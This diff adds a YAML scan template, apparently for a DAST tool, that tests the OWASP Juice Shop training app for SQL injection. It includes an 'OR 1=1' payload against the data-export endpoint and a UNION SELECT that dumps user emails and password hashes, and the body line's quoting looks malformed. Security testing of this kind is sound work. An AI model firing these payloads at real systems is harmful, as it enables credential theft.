@@ -1,0 +1,43 @@
+id: juice-shop-data-export-sqli
+info:
+  name: Data Export SQL Injection
+  author: dast-mvp
+  owasp_category: A05:2025
+  severity: critical
+  description: Tests for SQL injection in data export functionality
+  tags:
+    - juice-shop
+    - sqli
+    - data-exfiltration
+
+requests:
+  - path: /rest/user/data-export
+    method: POST
+    headers:
+      Authorization: "{{bearer_token}}"
+      Content-Type: application/json
+    body: '{"format":"' OR 1=1--"}'
+    matchers_condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'email'
+          - 'password'
+          - 'createdAt'
+        condition: and
+
+  - path: "/rest/products/search?q='))%20UNION%20SELECT%20id,email,password,1,1,1,1,1,1%20FROM%20Users--"
+    method: GET
+    matchers_condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - 'password'
+          - '@'
+        condition: and
